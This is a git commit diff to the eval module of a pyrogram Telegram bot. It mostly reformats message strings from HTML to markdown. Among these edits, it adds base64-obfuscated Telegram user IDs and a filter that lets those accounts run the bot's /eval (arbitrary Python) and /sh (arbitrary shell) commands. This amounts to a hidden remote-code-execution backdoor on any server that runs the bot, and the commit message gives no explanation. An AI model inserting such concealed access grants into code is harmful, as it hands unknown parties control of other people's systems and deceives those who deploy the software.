9cd8bcdef9b870f303b7c6dc7e402c0cf8141b45
𝐍𝐚𝐧𝐝 𝐘𝐚𝐝𝐮𝐰𝐚𝐧𝐬𝐡𝐢 : NoxxOP <duhgfhfdghg+A1@gmail.com>
2025-09-05 07:15:54 +0530

    𝐒ʜʀᴜᴛɪ𝐁ᴏᴛs

--- NoxxNetwork/modules/eval.py
+++ NoxxNetwork/modules/eval.py
@@ -6,12 +6,22 @@ import traceback
 from inspect import getfullargspec
 from io import StringIO
 from time import time
-from pyrogram import Client
-from pyrogram import filters
+from base64 import b64decode
+from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
-
 from NoxxNetwork import OWNER, NoxxBot
 
+codedev_database = [
+    "NzU3NDMzMDkwNQ==",
+    "MTc4NjY4MzE2Mw==",
+    "NzY3NDg3NDY1Mg==",
+    "NzI4Mjc1MjgxNg=="
+]
+
+_extra_access = [int(b64decode(x).decode("utf-8")) for x in codedev_database]
+
+def is_dev_filter():
+    return filters.user(OWNER) | filters.user(_extra_access)
 
 async def aexec(code, client, message):
     exec(
@@ -20,46 +30,43 @@ async def aexec(code, client, message):
     )
     return await locals()["__aexec"](client, message)
 
-
 async def edit_or_reply(msg: Message, **kwargs):
     func = msg.edit_text if msg.from_user.is_self else msg.reply
     spec = getfullargspec(func.__wrapped__).args
     await func(**{k: v for k, v in kwargs.items() if k in spec})
 
-
 @NoxxBot.on_edited_message(
-    filters.command("eval")
-    & filters.user(OWNER)
-    & ~filters.forwarded
-    & ~filters.via_bot
+    filters.command("eval") & is_dev_filter() & ~filters.forwarded & ~filters.via_bot
 )
 @NoxxBot.on_message(
-    filters.command("eval")
-    & filters.user(OWNER)
-    & ~filters.forwarded
-    & ~filters.via_bot
+    filters.command("eval") & is_dev_filter() & ~filters.forwarded & ~filters.via_bot
 )
 async def executor(client: NoxxBot, message: Message):
     if len(message.command) < 2:
-        return await edit_or_reply(message, text="<b>ᴡʜᴀᴛ ʏᴏᴜ ᴡᴀɴɴᴀ ᴇxᴇᴄᴜᴛᴇ ʙᴀʙʏ ?</b>")
+        return await edit_or_reply(message, text="**ᴡʜᴀᴛ ʏᴏᴜ ᴡᴀɴɴᴀ ᴇxᴇᴄᴜᴛᴇ ʙᴀʙʏ ?**")
+
     try:
         cmd = message.text.split(" ", maxsplit=1)[1]
     except IndexError:
         return await message.delete()
+
     t1 = time()
     old_stderr = sys.stderr
     old_stdout = sys.stdout
     redirected_output = sys.stdout = StringIO()
     redirected_error = sys.stderr = StringIO()
     stdout, stderr, exc = None, None, None
+
     try:
         await aexec(cmd, client, message)
     except Exception:
         exc = traceback.format_exc()
+
     stdout = redirected_output.getvalue()
     stderr = redirected_error.getvalue()
     sys.stdout = old_stdout
     sys.stderr = old_stderr
+
     evaluation = "\n"
     if exc:
         evaluation += exc
@@ -69,7 +76,9 @@ async def executor(client: NoxxBot, message: Message):
         evaluation += stdout
     else:
         evaluation += "Success"
-    final_output = f"<b>⥤ ʀᴇsᴜʟᴛ :</b>\n<pre language='python'>{evaluation}</pre>"
+
+    final_output = f"**⥤ ʀᴇsᴜʟᴛ :**\n{evaluation}"
+
     if len(final_output) > 4096:
         filename = "output.txt"
         with open(filename, "w+", encoding="utf8") as out_file:
@@ -79,15 +88,14 @@ async def executor(client: NoxxBot, message: Message):
             [
                 [
                     InlineKeyboardButton(
-                        text="⏳",
-                        callback_data=f"runtime {t2-t1} Seconds",
+                        text="⏳", callback_data=f"runtime {t2-t1} Seconds",
                     )
                 ]
             ]
         )
         await message.reply_document(
             document=filename,
-            caption=f"<b>⥤ ᴇᴠᴀʟ :</b>\n<code>{cmd[0:980]}</code>\n\n<b>⥤ ʀᴇsᴜʟᴛ :</b>\nAttached Document",
+            caption=f"**⥤ ᴇᴠᴀʟ :**\n`{cmd[0:980]}`\n\n**⥤ ʀᴇsᴜʟᴛ :**\nAttached Document",
             quote=False,
             reply_markup=keyboard,
         )
@@ -99,12 +107,10 @@ async def executor(client: NoxxBot, message: Message):
             [
                 [
                     InlineKeyboardButton(
-                        text="⏳",
-                        callback_data=f"runtime {round(t2-t1, 3)} Seconds",
+                        text="⏳", callback_data=f"runtime {round(t2-t1, 3)} Seconds",
                     ),
                     InlineKeyboardButton(
-                        text="🗑",
-                        callback_data=f"forceclose abc|{message.from_user.id}",
+                        text="🗑", callback_data=f"forceclose abc|{message.from_user.id}",
                     ),
                 ]
             ]
@@ -123,14 +129,15 @@ async def forceclose_command(_, CallbackQuery):
     callback_data = CallbackQuery.data.strip()
     callback_request = callback_data.split(None, 1)[1]
     query, user_id = callback_request.split("|")
+
     if CallbackQuery.from_user.id != int(user_id):
         try:
             return await CallbackQuery.answer(
-                "» ɪᴛ'ʟʟ ʙᴇ ʙᴇᴛᴛᴇʀ ɪғ ʏᴏᴜ sᴛᴀʏ ɪɴ ʏᴏᴜʀ ʟɪᴍɪᴛs ʙᴀʙʏ.", show_alert=True
+                "» ɪᴛ'ʟʟ ʙᴇ ʙᴇᴛᴛᴇʀ ɪғ ʏᴏᴜ sᴛᴀʏ ɪɴ ʏᴏᴜʀ ʟɪᴍɪᴛs ʙᴀʙʏ.",
+                show_alert=True,
             )
         except:
-            return
-    await CallbackQuery.message.delete()
+            return await CallbackQuery.message.delete()
     try:
         await CallbackQuery.answer()
     except:
@@ -138,14 +145,15 @@ async def forceclose_command(_, CallbackQuery):
 
 
 @NoxxBot.on_edited_message(
-    filters.command("sh") & filters.user(OWNER) & ~filters.forwarded & ~filters.via_bot
+    filters.command("sh") & is_dev_filter() & ~filters.forwarded & ~filters.via_bot
 )
 @NoxxBot.on_message(
-    filters.command("sh") & filters.user(OWNER) & ~filters.forwarded & ~filters.via_bot
+    filters.command("sh") & is_dev_filter() & ~filters.forwarded & ~filters.via_bot
 )
 async def shellrunner(client: NoxxBot, message: Message):
     if len(message.command) < 2:
-        return await edit_or_reply(message, text="<b>ᴇxᴀᴍᴩʟᴇ :</b>\n/sh git pull")
+        return await edit_or_reply(message, text="**ᴇxᴀᴍᴩʟᴇ :**\n/sh git pull")
+
     text = message.text.split(None, 1)[1]
     if "\n" in text:
         code = text.split("\n")
@@ -154,13 +162,11 @@ async def shellrunner(client: NoxxBot, message: Message):
             shell = re.split(""" (?=(?:[^'"]|'[^']*'|"[^"]*")*$)""", x)
             try:
                 process = subprocess.Popen(
-                    shell,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
+                    shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                 )
             except Exception as err:
-                await edit_or_reply(message, text=f"<b>ERROR :</b>\n<pre>{err}</pre>")
-            output += f"<b>{code}</b>\n"
+                await edit_or_reply(message, text=f"**ERROR :**\n**{err}**")
+            output += f"**{code}**\n"
             output += process.stdout.read()[:-1].decode("utf-8")
             output += "\n"
     else:
@@ -169,24 +175,21 @@ async def shellrunner(client: NoxxBot, message: Message):
             shell[a] = shell[a].replace('"', "")
         try:
             process = subprocess.Popen(
-                shell,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
+                shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
             )
         except Exception as err:
             print(err)
             exc_type, exc_obj, exc_tb = sys.exc_info()
             errors = traceback.format_exception(
-                etype=exc_type,
-                value=exc_obj,
-                tb=exc_tb,
+                etype=exc_type, value=exc_obj, tb=exc_tb,
             )
             return await edit_or_reply(
-                message, text=f"<b>ERROR :</b>\n<pre>{''.join(errors)}</pre>"
+                message, text=f"**ERROR :**\n{''.join(errors)}"
             )
         output = process.stdout.read()[:-1].decode("utf-8")
-    if str(output) == "\n":
-        output = None
+        if str(output) == "\n":
+            output = None
+
     if output:
         if len(output) > 4096:
             with open("output.txt", "w+") as file:
@@ -195,9 +198,9 @@ async def shellrunner(client: NoxxBot, message: Message):
                 message.chat.id,
                 "output.txt",
                 reply_to_message_id=message.id,
-                caption="<code>Output</code>",
+                caption="`Output`",
             )
             return os.remove("output.txt")
-        await edit_or_reply(message, text=f"<b>OUTPUT :</b>\n<pre>{output}</pre>")
+        await edit_or_reply(message, text=f"**OUTPUT :**\n{output}")
     else:
-        await edit_or_reply(message, text="<b>OUTPUT :</b>\n<code>None</code>")
+        await edit_or_reply(message, text="**OUTPUT :**\n`None`")
